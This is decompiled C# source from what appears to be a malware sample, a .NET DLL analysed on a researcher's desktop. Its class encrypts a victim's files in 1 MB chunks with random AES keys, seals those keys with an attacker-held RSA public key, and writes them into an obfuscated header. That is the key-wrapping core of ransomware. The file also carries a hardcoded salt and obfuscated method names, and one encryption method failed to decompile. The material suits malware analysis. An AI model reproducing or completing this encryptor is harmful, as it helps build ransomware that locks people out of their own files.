// Decompiled with JetBrains decompiler
// Type: dependent.encc
// Assembly: followed2, Version=1.2.2.4, Culture=neutral, PublicKeyToken=null
// MVID: 0250F156-BF70-4314-96EB-3665D78ED065
// Assembly location: C:\Users\jvallejo\Desktop\temp\bda230a18d42aabca4b6b9ccdd62dedd-cleaned.sample.dll

using Microsoft.VisualBasic.Devices;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace dependent
{
  internal class encc
  {
    public static string nnnlllll = Environment.NewLine;
    public static int chunkSize = 1048576;
    public static int headerSize = 3072;
    private static byte[] _salt = Encoding.ASCII.GetBytes("o6806642kbM7c5");

    public static int getAvailableRAM()
    {
      return Convert.ToInt32(ulong.Parse(new ComputerInfo().AvailablePhysicalMemory.ToString()));
    }

    public static string myff1(string plainFilePath, string encryptedFilePath, string manifestFilePath, string rsaKey)
    {
      byte[] signatureKey = encc.GenerateRandom(64);
      byte[] key = encc.GenerateRandom(16);
      byte[] iv = encc.GenerateRandom(16);
      encc.EncryptFile(plainFilePath, encryptedFilePath, key, iv, signatureKey, rsaKey);
      return (string) null;
    }

    private static void EncryptFile(string plainFilePath, string encryptedFilePath, byte[] key, byte[] iv, byte[] signatureKey, string rsaKey)
    {
      bool flag = true;
      FileInfo fileInfo = new FileInfo(plainFilePath);
      try
      {
        if (File.Exists(encryptedFilePath))
          File.Delete(encryptedFilePath);
        byte[] _ByteArray1 = new byte[encc.headerSize];
        encc.WriteBytesToFile(encryptedFilePath, _ByteArray1);
        for (long index = 0; index < fileInfo.Length / (long) encc.chunkSize + 1L; ++index)
        {
          int readCount;
          byte[] bytesFromFile = encc.GetBytesFromFile(plainFilePath, index * (long) encc.chunkSize, out readCount);
          byte[] plainBuf = new byte[readCount];
          int srcOffset = 0;
          byte[] numArray = plainBuf;
          int dstOffset = 0;
          int count = readCount;
          Buffer.BlockCopy((Array) bytesFromFile, srcOffset, (Array) numArray, dstOffset, count);
          if (readCount > 0)
          {
            byte[] _ByteArray2 = encc.EncryptStringToBytes(plainBuf, key, iv);
            if (!(flag = encc.WriteBytesToFile(encryptedFilePath, _ByteArray2)))
              break;
          }
        }
      }
      catch
      {
        if (File.Exists(encryptedFilePath))
          File.Delete(encryptedFilePath);
      }
      if (!flag)
        return;
      try
      {
        string str1 = Convert.ToBase64String(encc.RSAEncryptBytes(key, rsaKey));
        string str2 = Convert.ToBase64String(encc.RSAEncryptBytes(iv, rsaKey));
        string str3 = Convert.ToBase64String(encc.RSAEncryptBytes(signatureKey, rsaKey));
        byte[] bytesFromString = encc.GetBytesFromString("<AAAAAAAAAAAAAAAAAAAAA>" + (object) encc.nnnlllll + "<AAA>" + str1 + "</AAA>" + encc.nnnlllll + "<AA>" + str2 + "</AA>" + encc.nnnlllll + "<AAAAA>xPN1oBWSqfQgInnB6ydF204jiHN/uqljySnn1fkhqUk=</AAAAA>" + encc.nnnlllll + "<AAAAAAAAAAAA>" + str3 + "</AAAAAAAAAAAA>" + encc.nnnlllll + "<AAAAAAAAAAAAAAAAAA>" + (string) (object) fileInfo.Length + "</AAAAAAAAAAAAAAAAAA>" + encc.nnnlllll + "</AAAAAAAAAAAAAAAAAAAAA>");
        encc.WriteHeaderBytesToFile(encryptedFilePath, bytesFromString);
      }
      catch (Exception ex)
      {
        if (!File.Exists(encryptedFilePath))
          return;
        File.Delete(encryptedFilePath);
      }
    }

    public static byte[] GetBytesFromFile(string fullFilePath, long from, out int readCount)
    {
      using (FileStream fileStream = new FileStream(fullFilePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
      {
        byte[] buffer = new byte[encc.chunkSize];
        fileStream.Seek(from, SeekOrigin.Begin);
        readCount = fileStream.Read(buffer, 0, buffer.Length);
        return buffer;
      }
    }

    public static bool WriteBytesToFile(string _FileName, byte[] _ByteArray)
    {
      FileStream fileStream = new FileStream(_FileName, FileMode.Append, FileAccess.Write);
      try
      {
        fileStream.Write(_ByteArray, 0, _ByteArray.Length);
        fileStream.Close();
        return true;
      }
      catch (Exception ex)
      {
        fileStream.Close();
        if (File.Exists(_FileName))
          File.Delete(_FileName);
      }
      return false;
    }

    public static bool WriteHeaderBytesToFile(string _FileName, byte[] _ByteArray)
    {
      FileStream fileStream = new FileStream(_FileName, FileMode.OpenOrCreate, FileAccess.Write);
      try
      {
        fileStream.Write(_ByteArray, 0, _ByteArray.Length);
        fileStream.Close();
        return true;
      }
      catch (Exception ex)
      {
        fileStream.Close();
        if (File.Exists(_FileName))
          File.Delete(_FileName);
      }
      return false;
    }

    private static byte[] EncryptStringToBytes(byte[] plainBuf, byte[] Key, byte[] IV)
    {
      // ISSUE: unable to decompile the method.
        return null;
    }

    private static byte[] GenerateRandom(int length)
    {
      byte[] data = new byte[length];
      new RNGCryptoServiceProvider().GetBytes(data);
      return data;
    }

    public static byte[] RSAEncryptBytes(byte[] datas, string keyXml)
    {
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(2048))
      {
        cryptoServiceProvider.FromXmlString(keyXml);
        return cryptoServiceProvider.Encrypt(datas, true);
      }
    }

    public static byte[] GetBytesFromString(string str)
    {
      byte[] numArray = new byte[str.Length * 2];
      Buffer.BlockCopy((Array) str.ToCharArray(), 0, (Array) numArray, 0, numArray.Length);
      return numArray;
    }

    public static string EncryptStringAES(string plainText, string sharedSecret)
    {
      if (string.IsNullOrEmpty(plainText))
        throw new ArgumentNullException("plainText");
      if (string.IsNullOrEmpty(sharedSecret))
        throw new ArgumentNullException("sharedSecret");
      RijndaelManaged rijndaelManaged1 = (RijndaelManaged) null;
      try
      {
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(sharedSecret, encc._salt);
        rijndaelManaged1 = new RijndaelManaged();
        rijndaelManaged1.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged1.KeySize / 8);
        RijndaelManaged rijndaelManaged2 = rijndaelManaged1;
        byte[] key = rijndaelManaged2.Key;
        byte[] iv = rijndaelManaged1.IV;
        ICryptoTransform encryptor = rijndaelManaged2.CreateEncryptor(key, iv);
        using (MemoryStream memoryStream = new MemoryStream())
        {
          memoryStream.Write(BitConverter.GetBytes(rijndaelManaged1.IV.Length), 0, 4);
          memoryStream.Write(rijndaelManaged1.IV, 0, rijndaelManaged1.IV.Length);
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, encryptor, CryptoStreamMode.Write))
          {
            using (StreamWriter streamWriter = new StreamWriter((Stream) cryptoStream))
              streamWriter.Write(plainText);
          }
          return Convert.ToBase64String(memoryStream.ToArray());
        }
      }
      finally
      {
        if (rijndaelManaged1 != null)
          rijndaelManaged1.Clear();
      }
    }

    public static string myff11(string cipherText, string sharedSecret)
    {
      if (string.IsNullOrEmpty(cipherText))
        throw new ArgumentNullException("cipherText");
      if (string.IsNullOrEmpty(sharedSecret))
        throw new ArgumentNullException("sharedSecret");
      RijndaelManaged rijndaelManaged1 = (RijndaelManaged) null;
      try
      {
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(sharedSecret, encc._salt);
        using (MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(cipherText)))
        {
          rijndaelManaged1 = new RijndaelManaged();
          rijndaelManaged1.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged1.KeySize / 8);
          rijndaelManaged1.IV = encc.ReadByteArray((Stream) memoryStream);
          RijndaelManaged rijndaelManaged2 = rijndaelManaged1;
          byte[] key = rijndaelManaged2.Key;
          byte[] iv = rijndaelManaged1.IV;
          ICryptoTransform decryptor = rijndaelManaged2.CreateDecryptor(key, iv);
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read))
          {
            using (StreamReader streamReader = new StreamReader((Stream) cryptoStream))
              return streamReader.ReadToEnd();
          }
        }
      }
      finally
      {
        if (rijndaelManaged1 != null)
          rijndaelManaged1.Clear();
      }
    }

    private static byte[] ReadByteArray(Stream s)
    {
      byte[] buffer1 = new byte[4];
      if (s.Read(buffer1, 0, buffer1.Length) != buffer1.Length)
        throw new SystemException("Stream did not contain properly formatted byte array");
      byte[] buffer2 = new byte[BitConverter.ToInt32(buffer1, 0)];
      if (s.Read(buffer2, 0, buffer2.Length) != buffer2.Length)
        throw new SystemException("Did not read byte array properly");
      return buffer2;
    }
  }
}
